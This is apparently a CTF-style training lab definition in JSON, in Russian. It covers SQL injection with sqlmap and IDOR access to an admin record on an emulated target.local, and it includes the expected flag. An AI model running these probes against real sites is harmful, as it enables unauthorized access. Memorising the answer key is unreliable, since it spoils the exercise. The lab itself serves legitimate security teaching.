@@ -1,0 +1,28 @@
+{
+  "id": "web-recon-attack-entry",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{r3c0n_sqli_4nd_1d0r_3ntry}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: разведка — вход в классы уязвимостей\n\n`target.local` имеет форму входа и REST API. Проверь форму на SQLi и зайди\nв контроль доступа (IDOR) на API.\n\n1. Проверяем форму входа на SQLi:\n\n   sqlmap -u 'https://target.local/login' --data='user=admin&pass=x' --batch\n\n2. Заходим в контроль доступа (IDOR по id пользователя):\n\n   curl -s 'https://target.local/api/users/1' -H 'X-User: admin' > found.txt\n\n3. Набери `check`.\n" }
+  ],
+  "tools": {
+    "sqlmap": {
+      "help": "sqlmap -u <url> --data=<body> [--batch] — детектор SQLi (эмуляция)",
+      "cases": [
+        { "match": "sqlmap|login|--data", "example": "-u 'https://target.local/login' --data='user=admin&pass=x' --batch", "output": "[INFO] testing connection to the target URL\n[INFO] testing if POST parameter 'user' is dynamic\n[CRITICAL] parameter 'user' is vulnerable to SQL injection (boolean-based blind)\n[INFO] back-end DBMS: MySQL >= 8.0\n" }
+      ],
+      "fallback": "sqlmap: в этой лабе эмулируется детект SQLi на форме входа.\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция target.local)",
+      "cases": [
+        { "match": "api/users/1|users/1", "example": "-s 'https://target.local/api/users/1' -H 'X-User: admin'", "output": "{\"id\":1,\"username\":\"admin\",\"role\":\"admin\",\"secret\":\"nto{r3c0n_sqli_4nd_1d0r_3ntry}\"}\n" },
+        { "match": "api/users", "example": "-s 'https://target.local/api/users/2' -H 'X-User: admin'", "output": "{\"id\":2,\"username\":\"bob\",\"role\":\"user\"}\n" },
+        { "match": "target\\.local", "example": "-s https://target.local/", "output": "<!doctype html><title>target</title>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется target.local.\n"
+    }
+  }
+}
